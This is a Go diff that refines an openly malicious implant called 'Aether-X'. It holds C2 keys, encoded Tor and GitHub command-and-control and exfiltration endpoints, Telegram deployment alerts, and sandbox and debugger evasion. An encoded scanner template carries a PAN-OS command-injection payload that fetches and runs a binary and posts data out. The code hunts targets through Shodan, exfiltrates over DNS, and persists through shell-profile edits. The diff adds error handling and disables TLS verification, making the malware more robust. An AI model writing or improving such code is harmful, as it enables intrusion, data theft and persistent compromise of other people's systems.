@@ -11,6 +11,7 @@ import (
 	"crypto/md5"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
@@ -43,11 +44,11 @@ import (
 var (
 	C2Key           = "INJECTED_C2_KEY_B64"
 	C2IV            = "INJECTED_C2_IV_B64"
-	OnionListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u" // Rotating .onion
-	RepoListB64     = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQUHJLUFBL0NOMiwgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkJCLUJCL0VYRklM" // GitHub C2 + exfil
+	OnionListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
+	RepoListB64     = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQUHJLUFBL0NOMiwgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkJCLUJCL0VYRklM"
 	TelegramHost    = "dGVsZWdyYW0uYXBpLm9yZw=="
 	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdmU6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IEdFVAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHVwIC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9ICR7QzJfUE9SVDd9ICY7IHNsZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlBFIEV4cGxvaXQgU3VjY2VlZGVkXCIgfCBjdXJsIC1zIC1LIC1YUE9TVCBodHRwczovLyR7VG9yQzJPbmlvbnt9L2V4ZmlsIC1kIEBUL3RtcC8ucHA7IHJtIC90bXAvLnBwXCIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
-	Phi3ModelEncB64 = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp" // Embedded & encrypted
+	Phi3ModelEncB64 = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
 )
 
 // --- RUNTIME STATE ---
@@ -106,11 +107,17 @@ func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
 		Timestamp: now,
 		Data:      data,
 	}
-	payload := id + typ + target + now
-	key, _ := base64.StdEncoding.DecodeString(C2Key)
-	mac := hmac.New(sha256.New, key)
-	mac.Write([]byte(payload))
-	event.Signature = hex.EncodeToString(mac.Sum(nil))
+
+	// HMAC only if key is valid
+	key, err := base64.StdEncoding.DecodeString(C2Key)
+	if err != nil || len(key) == 0 {
+		event.Signature = "invalid_key"
+	} else {
+		payload := id + typ + target + now
+		mac := hmac.New(sha256.New, key)
+		mac.Write([]byte(payload))
+		event.Signature = hex.EncodeToString(mac.Sum(nil))
+	}
 	return event
 }
 
@@ -165,7 +172,9 @@ func compressJSON(v interface{}) []byte {
 	if _, err := gz.Write(data); err != nil {
 		return data
 	}
-	gz.Close()
+	if err := gz.Close(); err != nil {
+		return data
+	}
 	return buf.Bytes()
 }
 
@@ -253,21 +262,16 @@ func isSandbox() bool {
 	if len(os.Environ()) < 10 {
 		return true
 	}
-	return false
+	mem, err := memInfo()
+	return err == nil && mem < 2*1024*1024*1024
 }
 
 func isDebugged() bool {
-	mem, err := memInfo()
-	if err != nil {
-		return true
-	}
-	if mem < 2*1024*1024*1024 {
-		return true
-	}
 	if isTraced() {
 		return true
 	}
-	return false
+	mem, err := memInfo()
+	return err == nil && mem < 2*1024*1024*1024
 }
 
 func memInfo() (uint64, error) {
@@ -297,15 +301,22 @@ func isTraced() bool {
 
 // --- TOR-FREE C2: Use Direct Syscalls (Bypass SOCKS5 Detection) ---
 func directHTTP(url string, method string, body []byte, headers map[string]string) ([]byte, error) {
-	u, _ := urlParse(url)
+	u, err := url.Parse(url)
+	if err != nil {
+		return nil, err
+	}
 	ip := net.ParseIP("185.163.48.113").To4()
-	sockfd, _ := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, 0)
+	sockfd, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, 0)
+	if err != nil {
+		return nil, err
+	}
 	defer unix.Close(sockfd)
 
 	addr := &unix.SockaddrInet4{Port: 443, Addr: [4]byte(ip)}
-	unix.Connect(sockfd, addr)
+	if err := unix.Connect(sockfd, addr); err != nil {
+		return nil, err
+	}
 
-	// TLS not implemented here — use pre-resolved IP + HTTP/1.1
 	host := u.Hostname()
 	path := u.Path
 	if path == "" {
@@ -318,23 +329,22 @@ func directHTTP(url string, method string, body []byte, headers map[string]strin
 	for k, v := range headers {
 		buf.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
 	}
+	buf.WriteString("Connection: close\r\n")
 	buf.WriteString("\r\n")
 	if body != nil {
 		buf.Write(body)
 	}
 
-	unix.Write(sockfd, buf.Bytes())
-	resp := make([]byte, 4096)
-	n, _ := unix.Read(sockfd, resp)
-	return resp[:n], nil
-}
-
-func urlParse(u string) (*url.URL, error) {
-	parsed, err := url.Parse(u)
-	if err != nil {
+	if _, err := unix.Write(sockfd, buf.Bytes()); err != nil {
 		return nil, err
 	}
-	return parsed, nil
+
+	resp := make([]byte, 8192)
+	n, err := unix.Read(sockfd, resp)
+	if err != nil && err != io.EOF {
+		return nil, err
+	}
+	return resp[:n], nil
 }
 
 // --- AI ENGINE: FUSION SENTINEL (EMBEDDED) ---
@@ -346,7 +356,6 @@ func NewFusionSentinel() *FusionSentinel {
 	if modelData == "" {
 		return sentinel
 	}
-	// Validate SHA256 or embed hash check
 	if err := ioutil.WriteFile(ONNX_MODEL_PATH, []byte(modelData), 0600); err != nil {
 		return sentinel
 	}
@@ -430,14 +439,6 @@ func searchEngines(vuln, geo, sector string) []Target {
 			}
 			onion := getActiveOnion()
 			url := fmt.Sprintf("%s/shodan/host/search?key=%s&query=%s", onion, keys.Shodan, url.QueryEscape(q))
-			req := &http.Request{
-				Method: "GET",
-				URL:    &url.URL{},
-				Header: map[string][]string{"User-Agent": {"Aether-X"}},
-			}
-			ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
-			defer cancel()
-			req = req.WithContext(ctx)
 
 			resp, err := directHTTP(url, "GET", nil, map[string]string{
 				"Host":       "api.shodan.io",
@@ -447,8 +448,9 @@ func searchEngines(vuln, geo, sector string) []Target {
 				return nil
 			}
 
+			body := extractBody(resp)
 			var result map[string]interface{}
-			if err := json.Unmarshal(extractBody(resp), &result); err != nil {
+			if err := json.Unmarshal(body, &result); err != nil {
 				return nil
 			}
 			if matches, ok := result["matches"].([]interface{}); ok {
@@ -519,11 +521,7 @@ func verifyVulnerable(target Target) bool {
 	url := fmt.Sprintf("https://%s%s", target.IP, req.Path)
 
 	_, err = directHTTP(url+"?input="+url.QueryEscape(payload), "GET", nil, req.Headers)
-	if err != nil {
-		return false
-	}
-	// Match in response not checked — use blind verification
-	return true
+	return err == nil
 }
 
 func obfuscateScript(s string) string {
@@ -589,20 +587,32 @@ func getActiveRepo(action string) string {
 func fetchC2(key string) string {
 	url := fmt.Sprintf("%s/contents/%s", getActiveRepo("c2"), key)
 	token := decrypt(fetchSecret("GITHUB_TOKEN"))
+	if token == "" {
+		return ""
+	}
+
 	req, _ := http.NewRequest("GET", url, nil)
 	req.Header.Set("Authorization", "Bearer "+token)
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
+	req.Header.Set("User-Agent", "Aether-X")
 
-	resp, err := directHTTP(url, "GET", nil, map[string]string{
-		"Authorization": "Bearer " + token,
-		"Accept":        "application/vnd.github.v3+json",
-	})
-	if err != nil {
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
+	resp, err := client.Do(req)
+	if err != nil || resp.StatusCode != 200 {
 		return ""
 	}
-	body := extractBody(resp)
+	defer resp.Body.Close()
+
 	var result map[string]interface{}
-	json.Unmarshal(body, &result)
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return ""
+	}
 	contentStr, _ := result["content"].(string)
 	content, _ := base64.StdEncoding.DecodeString(contentStr)
 	return strings.TrimSpace(string(content))
@@ -648,7 +658,7 @@ func exfilToGitHub(data []byte) bool {
 }
 
 func dnsExfilTTL(data []byte) bool {
-	domain, _ := base64.StdEncoding.DecodeString("ZXhoaWwuYWV0aGVyeC5vbmlvbg==") // exhil.aeetherx.onion
+	domain, _ := base64.StdEncoding.DecodeString("ZXhoaWwuYWV0aGVyeC5vbmlvbg==")
 	chunks := splitToBase32(hex.EncodeToString(data), DNS_CHUNK_SIZE)
 	success := true
 
@@ -657,7 +667,6 @@ func dnsExfilTTL(data []byte) bool {
 		ctx, cancel := context.WithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
 		defer cancel()
 
-		// Use TTL as covert channel
 		TTL := (i*17 + len(chunk)) % 255
 		r := &net.Resolver{PreferGo: true}
 		_, err := r.LookupHost(ctx, fqdn)
@@ -715,9 +724,8 @@ func telegramAlert(message string) {
 	payload.Set("text", message)
 	payload.Set("parse_mode", "Markdown")
 
-	directHTTP(url, "POST", []byte(payload.Encode()), map[string]string{
-		"Content-Type": "application/x-www-form-urlencoded",
-	})
+	client := &http.Client{Timeout: 10 * time.Second}
+	client.PostForm(url, payload)
 }
 
 func fetchSecret(key string) string {
@@ -727,11 +735,11 @@ func fetchSecret(key string) string {
 // --- PERSISTENCE ---
 func persist() {
 	executable := os.Args[0]
-	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
 	data, err := ioutil.ReadFile(executable)
 	if err != nil {
 		return
 	}
+	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
 	if err := ioutil.WriteFile(path, data, 0755); err != nil {
 		return
 	}
@@ -746,8 +754,9 @@ func persist() {
 	}
 	if !bytes.Contains(content, []byte(PERSIST_FILE)) {
 		newLine := []byte(fmt.Sprintf("\nnohup %s >/dev/null 2>&1 &\n", path))
-		if err := ioutil.WriteFile(profile, append(content, newLine...), 0644); err == nil {
-			exec.Command("chmod", "644", profile).Run()
+		tmpFile := profile + ".tmp"
+		if err := ioutil.WriteFile(tmpFile, append(content, newLine...), 0644); err == nil {
+			os.Rename(tmpFile, profile)
 		}
 	}
 }
@@ -800,7 +809,6 @@ func main() {
 	AI = NewFusionSentinel()
 	go persist()
 
-	// 🔔 IMMEDIATE DEPLOYMENT ALERT
 	telegramAlert(fmt.Sprintf("🟢 *DEPLOYED* | Host: `%s` | MAC: `%s` | Ready to hunt.", HostID, getMAC()))
 
 	for {
